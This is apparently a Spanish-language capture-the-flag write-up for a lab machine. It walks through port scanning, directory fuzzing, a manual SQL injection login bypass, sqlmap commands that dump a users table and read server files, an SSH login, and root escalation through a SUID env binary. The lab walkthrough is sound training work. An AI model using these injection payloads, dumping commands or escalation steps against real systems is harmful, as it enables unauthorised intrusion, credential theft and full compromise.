
## 1. Reconocimiento

### Escaneo de puertos

```bash
sudo nmap -sS -p- 172.17.0.2
```

Puertos abiertos: 22 (SSH) y 80 (HTTP).

```bash
nmap -sVC -p22,80 172.17.0.2
```

- 22/tcp → OpenSSH 8.9p1 (Ubuntu)
- 80/tcp → Apache 2.4.52 — título: "NaturGas Solutions - Dashboard Corporativo"

### Enumeración web

La página principal no muestra vectores de ataque directos. Se lanza fuzzing de directorios:

```bash
gobuster dir -u http://172.17.0.2 -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

Rutas encontradas:

```
/intranet  (301)
/bills     (301)
```

`/bills` contiene un panel de login.

---
## 2. SQL Injection manual

Se prueban credenciales por defecto (`admin:admin`, `user:user`, `guest:guest`) sin éxito. Se prueba una inyección SQL básica en ambos campos:

```sql
' or 1=1 --
```

El login concede acceso como el usuario `mario`, pero sin privilegios suficientes para ver el contenido del panel. Esto confirma que el parámetro `username` es vulnerable a SQLi.

---
## 3. Explotación con sqlmap

### Enumeración de bases de datos

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" \
  --data="username=mario&password=empty" \
  --dbs --batch
```

Bases de datos encontradas:

```
information_schema / mysql / performance_schema / sys / register
```

La base de datos relevante es `register` — las demás son del sistema MySQL.

### Enumeración de tablas

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" \
  --data="username=mario&password=empty" \
  -D register --tables --batch
```

Una sola tabla: `users`.

### Volcado de credenciales

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" \
  --data="username=mario&password=empty" \
  -D register -T users --dump --batch
```

Resultado:

```
+----+-----------+----------+
| id | passwd    | username |
+----+-----------+----------+
| 1  | mario123  | mario    |
| 2  | jesus2026 | jesus    |
| 3  | admin123  | admin    |
+----+-----------+----------+
```

Se accede al panel con `admin:admin123` — acceso completo al listado de facturas con 20 IDs.

### Lectura del código fuente del panel

Para entender la lógica del panel y qué hace cada ID, se usa sqlmap para leer el archivo PHP directamente del servidor aprovechando los privilegios DBA del usuario MySQL:

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" \
  --data="username=mario&password=empty" \
  --file-read "/var/www/html/bills/panel.php" --batch
```

El archivo se guarda localmente y se lee con `cat`. Fragmento relevante:

```php
// Base de datos simulada con 20 IDs
// 19 IDs genéricos, 1 ID vulnerable (xyc724)
$database = [
    'xya123', 'xya456', 'xya789', 'xyb234', 'xyb567',
    'xyb890', 'xyc123', 'xyc456', 'xyd234', 'xyd567',
    'xyd890', 'xye123', 'xye456', 'xye789', 'xyf234',
    'xyf567', 'xyf890', 'xyg123', 'xyg456', 'xyc724' // ID vulnerable
];
```

El propio código fuente indica que `xyc724` es el ID vulnerable. Se introduce en el panel y revela credenciales SSH: `duque:<contraseña>`.

---
## 4. Acceso SSH

```bash
ssh duque@172.17.0.2
```

```bash
whoami  # duque
```

Flag de usuario disponible en `/home/duque/user.txt`.

---
## 5. Escalada de privilegios

### sudo -l

```bash
sudo -l
# Sorry, user duque may not run sudo on 4e1ac97cd063.
```

Sin permisos sudo. Se busca otra vía.

### Binarios con SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

Entre los resultados aparece `/usr/bin/env` con el bit SUID activo. `env` es un binario que ejecuta otros programas — si tiene SUID de root, cualquier comando que se le pase hereda esos privilegios.

```bash
env /bin/sh -p
```

```bash
whoami  # root
id      # uid=1000(duque) gid=1000(duque) euid=0(root) groups=1000(duque)
```

El flag `-p` es clave: le dice a la shell que preserve el `euid` efectivo (root) en lugar de descartarlo al iniciar. Sin `-p`, muchas shells modernas descartan el SUID por seguridad.

Flag de root disponible en `/root/root.txt`.
